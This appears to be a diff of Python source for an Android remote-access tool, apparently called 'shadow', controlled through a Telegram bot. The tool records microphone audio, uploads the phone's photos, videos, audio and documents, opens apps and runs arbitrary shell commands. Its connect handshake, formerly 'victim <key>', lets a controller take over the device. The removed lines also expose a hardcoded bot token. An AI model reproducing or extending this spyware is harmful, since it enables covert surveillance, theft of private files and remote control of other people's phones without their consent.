@@ -1,4 +1,4 @@
-import time,subprocess,requests,os,platform,threading
+import time,subprocess,requests,os,platform,threading,json
 from jnius import autoclass
 
 def send_message(message):
@@ -51,7 +51,7 @@ def internet():
         return {'ok':result.status_code == 200,'result':result.status_code}
     except Exception as error: return {'ok':False,'result':error}
 
-def start_recording(sec=10):
+def start_recording(sec):
     try:
         time.sleep(2)
         MediaRecorder = autoclass('android.media.MediaRecorder')
@@ -101,6 +101,22 @@ def open_app(package_name):
         else: send_message(f'App `{package_name}` Not Found In Phone!')
     except Exception as error: send_message(f'Opening Error: `{error}`')
 
+def loop(process,end):
+    try:
+        time.sleep(2)
+        if end < 60:
+            send_message(f'Menimum End Value Must Be `60`s')
+            return
+        end_value = time.time()+end
+        if process == 'gohome':
+            send_message(f'`{process}` Loop Started, Ending Time: `{end}`s')
+            while time.time() <= end_value:
+                go_home()
+                time.sleep(5)
+            send_message(f'`{process}` Loop Finished')
+        else: send_message('Invalid Option For `loop`')
+    except Exception as error: send_message(f'Looping Error: `{error}`')
+
 def gen_response(cmd):
     try:
         parts = cmd.strip().split()
@@ -109,37 +125,42 @@ def gen_response(cmd):
         main = parts[0]
         if cmdlen == 1 and main.lower() == 'active': return f'`{device}` is active'
         elif cmdlen == 1 and main.lower() == 'sysinfo': return f'*Software*\n\nsystem: `{platform.system()}`\nrelease: `{platform.release()}`\nversion: `{platform.version()}`\nmachine: `{platform.machine()}`\n\n*Hardware*\n\nbrand: `{subprocess.getoutput("getprop ro.product.brand")}`\ndevice: `{subprocess.getoutput("getprop ro.product.device")}`\nandroid: `{subprocess.getoutput("getprop ro.build.version.release")}`\nmanufacturer: `{subprocess.getoutput("getprop ro.product.manufacturer")}`'
-        elif cmdlen == 3 and main.lower() == 'start':
-            if parts[1] == 'record':
-                threading.Thread(target=start_recording,args=(int(parts[2]),),daemon=True).start()
-                return f'`{parts[1]}` request sended'
-            elif parts[1] == 'go_home':
-                threading.Thread(target=go_home,daemon=True).start()
-                return f'`{parts[1]}` request sended'
-            elif parts[1] == 'app':
-                threading.Thread(target=open_app,args=(parts[2],),daemon=True).start()
-                return f'`{parts[1]}` request sended'
-            else: return f'Invalid Option For `{parts[0]}`'
+        elif cmdlen == 1 and main.lower() == 'count': return f'*Shadow Total Running Count On* `{device}`: `{count}`'
+        elif cmdlen == 1 and main.lower() == 'uiargv': return f'*UI Argv:* `{os.environ.get('PYTHON_SERVICE_ARGUMENT','No Argvs')}`'
+        elif cmdlen == 3 and main.lower() == 'loop':
+            threading.Thread(target=loop,args=(parts[1],int(parts[2]),),daemon=True).start()
+            return f'`{main}` Requests Sended'
+        elif cmdlen == 2 and main.lower() == 'record':
+            threading.Thread(target=start_recording,args=(int(parts[1]),),daemon=True).start()
+            return f'`{main}` Requests Sended'
+        elif cmdlen == 1 and main.lower() == 'gohome':
+            threading.Thread(target=go_home,daemon=True).start()
+            return f'`{main}` Requests Sended'
+        elif cmdlen == 2 and main.lower() == 'app':
+            threading.Thread(target=open_app,args=(parts[1],),daemon=True).start()
+            return f'`{main}` Requests Sended'
         elif cmdlen == 3 and main.lower() == 'send':
-            if not os.path.exists(parts[2]): return f'Path Not Found `{parts[2]}`'
-            file_details = subprocess.getoutput(f'stat {parts[2]}')
+            path = f'/sdcard/{parts[2]}'
+            if not os.path.exists(path): return f'Path Not Found `{path}`'
+            file_details = subprocess.getoutput(f'stat {path}')
             if parts[1] == 'photo':
-                send_photo(parts[2],file_details)
-                return f'`{parts[1]}` requests sended'
+                send_photo(path,file_details)
+                return f'`{parts[1]}` Requests Sended'
             elif parts[1] == 'video':
-                send_video(parts[2],file_details)
-                return f'`{parts[1]}` requests sended'
+                send_video(path,file_details)
+                return f'`{parts[1]}` Requests Sended'
             elif parts[1] == 'audio':
-                send_audio(parts[2],file_details)
-                return f'`{parts[1]}` requests sended'
+                send_audio(path,file_details)
+                return f'`{parts[1]}` Requests Sended'
             elif parts[1] == 'voice':
-                send_voice(parts[2],file_details)
-                return f'`{parts[1]}` requests sended'
+                send_voice(path,file_details)
+                return f'`{parts[1]}` Requests Sended'
             elif parts[1] == 'document':
-                send_document(parts[2],file_details)
-                return f'`{parts[1]}` requests sended'
-            else: return f'Invalid Option For `{parts[0]}`'
+                send_document(path,file_details)
+                return f'`{parts[1]}` Requests Sended'
+            else: return f'Invalid Option For `{main}`'
         elif cmdlen > 1 and main == ':':
+            send_message(f'Executing Shell Command(`{" ".join(parts[1:])}`)...')
             result = subprocess.run(parts[1:],capture_output=True,text=True,timeout=5)
             if result.stderr: return f'```Executing(err)\n{result.stderr}```'
             if result.stdout: return f'```Executing(res)\n{result.stdout}```'
@@ -150,34 +171,34 @@ def gen_response(cmd):
 count = 0
 seen_id = []
 offset = None
-root_user = None
-device = subprocess.getoutput("getprop ro.product.brand")
-bot_token = '8498919917:AAEJrci5vCXGL2_uvpYHyFhv6qGEi1iohqI'
-root_key = f'{device.strip().lower().split()[0] if device else "unknown"}:{subprocess.getoutput("getprop ro.build.version.release").strip().lower().split()[0] if subprocess.getoutput("getprop ro.build.version.release") else "00"}XX'
+root_user = json.load(open('settings.json'))['root_id']
+bot_token = json.load(open('settings.json'))['bot_token']
+root_key = os.environ.get('PYTHON_SERVICE_ARGUMENT','unknown:00xx')
+device = subprocess.getoutput("getprop ro.product.brand").strip().lower().split()[0]
 
-print('root_key:',root_key,'\n\nrunning....\n')
+print('* root_key:',root_key,'\n* root_user:',root_user,'\n* shadow`s running....')
 
 while True:
     try:
         if not internet()['ok']:
-            print('waiting for connection...')
+            print('* waiting for connection...')
             while True:
                 result = internet()['ok']
                 if result:
                     if root_user: send_message(f'`{device}` back to connection')
                     break
                 time.sleep(0.5)
-            print('connected\n')
+            print('* connected')
         new_update = get_update(offset)
         if not new_update['ok']:
-            print('get update:',new_update['result'])
+            print('* get update:',new_update['result'])
             time.sleep(0.5)
             continue
         update = new_update['result']
         update_id = update['update_id']
         offset = update_id+1
-        if update_id in seen_id or count == 0:
-            if count == 0: seen_id.append(update_id)
+        if count == 0:
+            seen_id.append(update_id)
             time.sleep(0.5)
             count += 1
             continue
@@ -185,15 +206,17 @@ while True:
         try:
             message = update['message']['text']
         except KeyError:
-            print('unknown text formate message recived:',chat_id)
+            print('* unknown text formate recived:',chat_id)
             seen_id.append(update_id)
             time.sleep(0.5)
             count += 1
             continue
-        if len(message.strip().lower().split()) == 2 and message.strip().lower().split()[0] == 'victim' and message.strip().split()[1] == root_key:
+        temp_cmd = message.strip().lower().split()
+        if len(temp_cmd) == 2 and temp_cmd[0] == 'connect' and temp_cmd[1] == root_key:
             if root_user: send_message(f'You Are Disconnected 2 `{device}`\nNew User Takeover 2 `{device}`\nNew User: `{chat_id}`')
+            with open('settings.json','w') as f: json.dump({'root_id':chat_id,'bot_token':bot_token},f)
             root_user = chat_id
-            print('new user takeover 2 system:',chat_id,'\n')
+            print('* new user takeover 2 system:',chat_id)
             send_message(f'`{device}` Connected 2 Bot.')
             seen_id.append(update_id)
             time.sleep(0.5)
@@ -204,21 +227,22 @@ while True:
             time.sleep(0.5)
             count += 1
             continue
-        if len(message.strip().lower().split()) == 1 and message.strip().lower().split()[0] == 'disconnect':
+        if len(temp_cmd) == 2 and temp_cmd[0] == 'disconnect' and temp_cmd[1] == device.strip().lower():
+            with open('root_user.json','w') as f: json.dump({'root_id':None,'bot_token':bot_token},f)
             send_message(f'Now You Are Disconnected 2 `{device}`')
-            print(f'current user disconnected 2 `{device}`')
+            print(f'* current user disconnected 2 system')
             seen_id.append(update_id)
             root_user = None
             time.sleep(0.5)
             count += 1
             continue
-        response = gen_response(message)
-        print(send_message(response))
+        response = gen_response(message) # conform ivan root user dhan so reponse gen pandom.
+        print('* message send:',send_message(response))
         seen_id.append(update_id)
         time.sleep(0.5)
         count += 1
         continue
     except Exception as error:
-        print('main eror:',error)
+        print('* main eror:',error)
         time.sleep(0.5)
         continue
